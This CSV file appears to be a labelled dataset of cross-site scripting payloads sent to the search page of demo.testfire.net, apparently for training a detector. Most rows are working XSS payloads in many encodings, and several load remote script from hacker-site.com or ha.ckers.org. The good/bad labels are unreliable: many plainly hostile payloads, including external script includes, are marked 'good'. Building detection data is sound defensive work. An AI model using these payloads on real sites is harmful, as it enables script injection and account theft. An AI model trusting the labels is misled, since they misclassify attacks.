path,content,host,class_flag
"/search.jsp?query=""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",,demo.testfire.net,['bad']
"/search.jsp?query=\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",,demo.testfire.net,['bad']
/search.jsp?query=http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,,demo.testfire.net,['good']
/search.jsp?query=http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,,demo.testfire.net,['good']
/search.jsp?query='); alert('xss'); var x=',,demo.testfire.net,['bad']
/search.jsp?query=\\'); alert(\'xss\');var x=\',,demo.testfire.net,['bad']
"/search.jsp?query=//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",,demo.testfire.net,['bad']
"/search.jsp?query=>""><ScRiPt 
>alert(561177485777);</ScRiPt>",,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",,demo.testfire.net,['bad']
/search.jsp?query=</body>,,demo.testfire.net,['bad']
/search.jsp?query=</html>,,demo.testfire.net,['bad']
/search.jsp?query=<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,,demo.testfire.net,['bad']
/search.jsp?query=<SCRIPT> alert(XSS); </SCRIPT>,,demo.testfire.net,['bad']
"/search.jsp?query=<BODY ONLOAD=alert(""XSS"")>",,demo.testfire.net,['bad']
"/search.jsp?query=<BODY BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG DYNSRC=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG LOWSRC=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
/search.jsp?query=<IFRAME SRC=http://hacker-site.com/xss.html>,,demo.testfire.net,['bad']
"/search.jsp?query=<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<TABLE BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<TD BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""width: expression(alert('XSS'));"">",,demo.testfire.net,['bad']
"/search.jsp?query=<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",,demo.testfire.net,['bad']
"/search.jsp?query=<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",,demo.testfire.net,['bad']
"/search.jsp?query=&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser,,demo.testfire.net,['good']
/search.jsp?query=exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,,demo.testfire.net,['good']
/search.jsp?query=&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS,,demo.testfire.net,['good']
/search.jsp?query=&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",,demo.testfire.net,['good']
/search.jsp?query=&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;,,demo.testfire.net,['good']
/search.jsp?query=a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);,,demo.testfire.net,['bad']
/search.jsp?query=&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;HTML xmlns:xss&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;HTML&gt;&lt;BODY&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;!--[if gte IE 4]&gt;               ,,demo.testfire.net,['good']
/search.jsp?query=&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;? echo(&apos;&lt;SCR)&apos;;,,demo.testfire.net,['good']
/search.jsp?query=&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-,,demo.testfire.net,['bad']
/search.jsp?query=\&quot;;alert(&apos;XSS&apos;);//,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,,demo.testfire.net,['bad']
/search.jsp?query=perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,,demo.testfire.net,['bad']
/search.jsp?query=perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT SRC=http://ha.ckers.org/xss.js,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT&gt;a=/XSS/,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://www.google.com&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,,demo.testfire.net,['good']
